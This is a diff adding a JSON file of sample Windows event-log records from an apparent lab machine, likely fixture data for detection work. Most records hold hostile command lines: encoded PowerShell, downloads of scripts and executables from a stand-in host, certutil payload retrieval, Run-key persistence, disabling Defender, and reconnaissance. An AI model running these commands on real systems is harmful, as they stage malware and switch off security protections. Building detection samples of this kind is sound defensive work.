@@ -1,0 +1,74 @@
+[
+  {
+    "Source": "SAMPLE",
+    "EventId": 4104,
+    "TimeCreated": "2026-08-22T09:14:03",
+    "User": "LAB\\student",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA=="
+  },
+  {
+    "Source": "SAMPLE",
+    "EventId": 4104,
+    "TimeCreated": "2026-08-22T09:15:20",
+    "User": "LAB\\student",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "CommandLine": "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/stage1.ps1')"
+  },
+  {
+    "Source": "SAMPLE",
+    "EventId": 4688,
+    "TimeCreated": "2026-08-22T09:16:41",
+    "User": "LAB\\student",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "CommandLine": "cmd.exe /c start /min powershell -w hidden -nop -c \"iwr http://192.0.2.10/a.exe -OutFile $env:TEMP\\a.exe\""
+  },
+  {
+    "Source": "SAMPLE",
+    "EventId": 4688,
+    "TimeCreated": "2026-08-22T09:18:02",
+    "User": "LAB\\student",
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://192.0.2.10/payload.b64 payload.b64"
+  },
+  {
+    "Source": "SAMPLE",
+    "EventId": 4688,
+    "TimeCreated": "2026-08-22T09:19:37",
+    "User": "LAB\\student",
+    "Image": "C:\\Windows\\System32\\reg.exe",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\Users\\Public\\updater.exe\" /f"
+  },
+  {
+    "Source": "SAMPLE",
+    "EventId": 4104,
+    "TimeCreated": "2026-08-22T09:21:10",
+    "User": "LAB\\student",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\\Users\\Public"
+  },
+  {
+    "Source": "SAMPLE",
+    "EventId": 4688,
+    "TimeCreated": "2026-08-22T09:23:55",
+    "User": "LAB\\student",
+    "Image": "C:\\Windows\\System32\\whoami.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "whoami /all"
+  },
+  {
+    "Source": "SAMPLE",
+    "EventId": 4104,
+    "TimeCreated": "2026-08-22T09:25:12",
+    "User": "LAB\\student",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "CommandLine": "Get-ChildItem C:\\Users\\student\\Documents -Recurse | Measure-Object"
+  }
+]
